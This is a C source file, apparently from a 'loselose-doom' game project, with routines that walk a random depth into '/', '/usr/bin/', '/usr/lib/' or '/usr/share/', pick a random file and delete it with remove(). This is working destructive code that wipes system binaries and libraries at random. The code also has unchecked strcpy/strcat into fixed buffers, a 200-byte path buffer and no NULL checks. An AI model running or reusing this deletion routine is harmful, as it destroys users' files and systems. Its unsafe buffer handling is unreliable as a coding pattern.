#include "loselose-doom.h"

char strt_dirs[STRT_DIRS][MAX_PATH_LENGTH] = {
	"/",
	"/usr/bin/",
	"/usr/lib/",
	"/usr/share/"
	};

//Removes a random file
void remove_random(char *deleted_path) {
	char path[200];
	random_file(path);
	strcpy(deleted_path, path);
	remove(path);
	printf("Deleted: %s\n",path);
}




//Picks a random file and stores the path in return_path
void random_file(char *return_path) {
	char path[MAX_PATH_LENGTH];
	char test_path[MAX_PATH_LENGTH];
	struct stat path_stat;
	DIR *directory;
	struct dirent *ep;
	int num_child;
	int has_children = 1;
	int num_dirs, st_dir;
	
	//A random number between 0 and MAX_DIR_DEPTH gets picked
	struct timeval t;
	gettimeofday(&t,NULL);
	srand(t.tv_usec);
	num_dirs = rand() % MAX_DIR_DEPTH;
	//printf("Level of recursion: %d\n", num_dirs);
	
	
	//And a starting directory gets picked
	st_dir = rand() % STRT_DIRS;
	strcpy(path, strt_dirs[st_dir]);
	//printf("%s has been selected as a starting dir\n", path);

	
	//Starting from root, the loop will enter as much as num_dirs dirs.
	while (num_dirs > 0 && has_children) {
		//The directory gets opened
		directory = opendir(path);
		
		//A count of the child directories is kept
		num_child = 0;

		//The number of child dirs inside the parent dir gets counted
		while ((ep = readdir(directory)) != NULL) {
			//Only directories can be accessed, so every single file in the path has to be checked
			strcpy(test_path, path);
			strcat(test_path, ep->d_name);
			stat(test_path, &path_stat);

			//If the file is a directory and it's not . or .., the number of children gets updated
			if (S_ISDIR(path_stat.st_mode) && 
				ep->d_type != 10 && 			//The file is not a link
				strcmp(ep->d_name, ".") != 0 && 
				strcmp(ep->d_name, "..") != 0) {
				num_child++;
				//puts(ep->d_name);
			}
		}

		//If there are no more subdirectories, the loop exits
		if (num_child == 0) {
			//puts("This directory has no more children\n");
			has_children = 0;
		} else {
			//If there are more children, a random directory gets picked from those children
			num_child = rand() % num_child;		
			//This is done so that 0 can never be picked
			if (num_child == 0) {
				num_child = 1;
			}

			//printf("The child %d would be picked\n", num_child);
			
			//The path gets reloaded
			closedir(directory);
			directory = opendir(path);
			
			//The new path gets selected
			while(num_child > 0) {
				ep = readdir(directory);
	
				//If the file is a regular file, .., or ., it doesn't pick it
				strcpy(test_path, path);
				strcat(test_path, ep->d_name);
				stat(test_path, &path_stat);

				if (S_ISDIR(path_stat.st_mode) && 
					ep->d_type != 10 && 			//The file is not a link
					strcmp(ep->d_name, ".") != 0 && 
					strcmp(ep->d_name, "..") != 0) {
					num_child--;
					//puts(ep->d_name);
				}
			}
	
			//And a new filepath gets calculated
			strcat(path, ep->d_name);
			strcat(path, "/");
			//puts(path);
			closedir(directory);
		}
	}


	//Once a directory has been picked, a file from that directory gets selected
	//Same logic applies, the directory gets listed and one random file gets selected
		
	directory = opendir(path);

	num_child = 0;

	while ((ep = readdir(directory)) != NULL) {
		//The file gets tested
		strcpy(test_path, path);
		strcat(test_path, ep->d_name);
		stat(test_path, &path_stat);

		//If the file is not a directory, it gets counted
		if (!S_ISDIR(path_stat.st_mode) && !S_ISLNK(path_stat.st_mode)) {
			num_child++;
			//puts(ep->d_name);
		}
	}

		//If there are no files, that means the directory is empty, therefore, it has to be picked
	if (num_child == 0) {
		//return path;
		//puts(path);
	} else {
		//If there's more than one file, one gets picked randomly
		num_child = rand() % num_child;		

		//This is done so that 0 can never be picked
		if (num_child == 0) {
			num_child = 1;
		}

		//printf("The file %d would be picked\n", num_child);
		
		//The path gets reloaded
		closedir(directory);
		directory = opendir(path);
		
		//The new path gets selected
		while(num_child > 0) {
			ep = readdir(directory);

			strcpy(test_path, path);
			strcat(test_path, ep->d_name);
			stat(test_path, &path_stat);
			
			//Links and directories dont count as files
			if (!S_ISDIR(path_stat.st_mode) && !S_ISLNK(path_stat.st_mode)) {
				num_child--;
				//puts(ep->d_name);
			}
		}

		//And a new filepath gets calculated
		strcat(path, ep->d_name);
		//puts(path);
	}
	closedir(directory);

	//puts(path);
	strcpy(return_path,path);
}



